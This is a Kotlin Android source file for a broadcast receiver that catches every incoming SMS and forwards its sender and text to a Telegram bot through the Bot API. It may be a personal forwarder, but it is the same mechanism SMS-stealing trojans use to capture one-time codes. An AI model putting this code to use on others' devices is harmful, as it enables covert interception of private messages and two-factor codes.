package com.example.sms_courier

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class SmsReceiver : BroadcastReceiver() {
    private val BOT_TOKEN = BuildConfig.BOT_TOKEN
    private val CHAT_ID = BuildConfig.CHAT_ID

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            try {
                if (bundle != null) {
                    val pdus = bundle.get("pdus") as Array<*>
                    for (i in pdus.indices) {
                        val format = bundle.getString("format")
                        // Парсим PDU в сообщение
                        val message = SmsMessage.createFromPdu(pdus[i] as ByteArray, format)

                        val sender = message.displayOriginatingAddress // Кто прислал
                        val text = message.displayMessageBody // Текст сообщения

                        // Формируем текст для отправки
                        val finalMessage = "📩 *New SMS*\n\nFrom: $sender\nText: $text"

                        // Отправляем в Telegram
                        sendToTelegram(finalMessage)
                    }
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Error parsing SMS: ${e.message}")
            }
        }
    }

    private fun sendToTelegram(message: String) {
        // Запускаем в отдельном потоке, так как сеть нельзя трогать в Main Thread
        Thread {
            try {
                // Кодируем сообщение для URL (пробелы превращаются в %20 и т.д.)
                val encodedMessage = URLEncoder.encode(message, "UTF-8")
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedMessage&parse_mode=Markdown"

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"

                // Просто дергаем ручку, ответ нам особо не важен (но можно проверить conn.responseCode)
                val responseCode = conn.responseCode
                Log.d("TelegramBot", "Response Code: $responseCode")

                conn.disconnect()
            } catch (e: Exception) {
                Log.e("TelegramBot", "Error sending: ${e.message}")
            }
        }.start()
    }
}